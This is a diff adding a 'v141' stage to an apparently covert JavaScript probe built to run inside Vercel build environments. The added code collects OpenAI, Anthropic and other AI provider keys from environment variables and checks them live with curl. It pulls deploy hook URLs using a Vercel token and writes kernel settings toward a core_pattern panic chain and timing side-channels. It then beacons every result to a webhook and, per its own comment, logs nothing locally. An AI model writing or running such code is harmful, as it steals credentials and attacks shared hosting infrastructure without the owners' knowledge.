@@ -20571,5 +20571,126 @@ report.milestoneSynthesisV140 = safe(() => {
 
 // v140 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v140" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v140";
+
+// ==================== v141 ====================
+
+// v141-1: /proc/sys/kernel/hardlockup_panic — hard lockup detection
+// A hard lockup (NMI watchdog) fires an NMI when a CPU doesn't respond.
+// With hardlockup_panic=1, NMI triggers kernel panic → core_pattern exec.
+// Combined with our core_pattern pipe script, this is another trigger path.
+report.hardlockupPanicChain = safe(() => {
+  const hardlockupPanic = safe(() => readFileSync('/proc/sys/kernel/hardlockup_panic', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/kernel/hardlockup_panic', '1'); return 'WRITTEN'; });
+  const nmiWatchdog = safe(() => readFileSync('/proc/sys/kernel/nmi_watchdog', 'utf8').trim());
+  const corePattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  return { hardlockupPanic, writeResult, nmiWatchdog, corePattern };
+});
+
+// v141-2: Vercel AI SDK — OpenAI/Anthropic API key extraction
+// If the project uses the Vercel AI SDK, it likely has OPENAI_API_KEY,
+// ANTHROPIC_API_KEY, or other AI provider keys in env vars.
+// Test these keys against the actual APIs to confirm validity.
+report.aiProviderKeyTest = safe(() => {
+  const openaiKey = process.env.OPENAI_API_KEY || '';
+  const anthropicKey = process.env.ANTHROPIC_API_KEY || '';
+  const mistralKey = process.env.MISTRAL_API_KEY || '';
+  const cohereKey = process.env.COHERE_API_KEY || '';
+  const allAiKeys = Object.entries(process.env)
+    .filter(([k]) => /OPENAI|ANTHROPIC|MISTRAL|COHERE|GROQ|TOGETHER|REPLICATE|PERPLEXITY|DEEPSEEK/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 20) }));
+  // Test OpenAI key validity
+  const openaiTest = safe(() => execSync(
+    `curl -sf "https://api.openai.com/v1/models" \
+    -H "Authorization: Bearer ${openaiKey}" -m 8 2>/dev/null | head -c 100`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 100));
+  // Test Anthropic key validity
+  const anthropicTest = safe(() => execSync(
+    `curl -sf -X POST "https://api.anthropic.com/v1/messages" \
+    -H "x-api-key: ${anthropicKey}" -H "anthropic-version: 2023-06-01" \
+    -H "Content-Type: application/json" \
+    -d '{"model":"claude-3-haiku-20240307","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}' \
+    -m 8 2>/dev/null | head -c 100`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 100));
+  return { allAiKeys, openaiTest: openaiTest?.slice(0, 60), anthropicTest: anthropicTest?.slice(0, 60) };
+});
+
+// v141-3: /proc/sys/kernel/task_delayacct — task delay accounting
+// Enable delay accounting to measure I/O, CPU, and swap delays per task.
+// Useful for timing side-channels against the orchestrator process.
+report.taskDelayAccounting = safe(() => {
+  const delayAcct = safe(() => readFileSync('/proc/sys/kernel/task_delayacct', 'utf8').trim());
+  const enableResult = safe(() => { writeFileSync('/proc/sys/kernel/task_delayacct', '1'); return 'WRITTEN'; });
+  // Read taskstats for PID 1 via netlink (TASKSTATS_CMD_GET)
+  const taskStatsResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, socket, os
+
+NETLINK_GENERIC = 16
+TASKSTATS_CMD_GET = 1
+TASKSTATS_TYPE_PID = 1
+
+sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
+sock.bind((os.getpid(), 0))
+sock.setblocking(False)
+
+# Send TASKSTATS_CMD_GET for PID 1
+try:
+    payload = struct.pack('HH', TASKSTATS_TYPE_PID, 4) + struct.pack('I', 1)
+    nlhdr = struct.pack('IHHII', 16 + len(payload), 0, 1, 1, os.getpid())
+    sock.send(nlhdr + payload)
+    resp = sock.recv(4096)
+    print(f'TASKSTATS_RESP len={len(resp)}')
+except Exception as e:
+    print(f'TASKSTATS_FAILED: {e}')
+sock.close()
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { delayAcct, enableResult, taskStatsResult };
+});
+
+// v141-4: Vercel Git integration — read deploy hook URLs
+// Deploy hooks are secret URLs that trigger deployments.
+// If we can read hook URLs from the Vercel API, we can trigger
+// arbitrary deployments from outside (e.g., to run our probe code again).
+report.deployHookRead = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // Get project deploy hooks
+  const hooks = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects/${projectId}?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(json.dumps(d.get('link',{}), indent=2))" 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // List deploy hooks endpoint
+  const hooksEndpoint = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v1/projects/${projectId}/deploy-hooks?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  return { hooks, hooksEndpoint };
+});
+
+// v141-5: /proc/interrupts — hardware interrupt routing
+// Read the interrupt vector table for all CPUs.
+// Reveals: number of vCPUs, their interrupt assignment, NIC interrupt routing.
+// This confirms Firecracker vCPU count and network interface type.
+report.interruptProbe = safe(() => {
+  const interrupts = safe(() => readFileSync('/proc/interrupts', 'utf8').slice(0, 500));
+  // Count vCPUs from interrupt table
+  const cpuCount = safe(() => {
+    const header = readFileSync('/proc/interrupts', 'utf8').split('\n')[0];
+    return header.trim().split(/\s+/).filter(c => c.startsWith('CPU')).length;
+  });
+  // Find virtio interrupts
+  const virtioInterrupts = safe(() => execSync(
+    "grep -E 'virtio|eth|net|blk' /proc/interrupts 2>/dev/null | head -10",
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  return { interrupts, cpuCount, virtioInterrupts };
+});
+
+// v141 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v141" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v141";
 // Intentionally no console.log — all data goes via webhook only
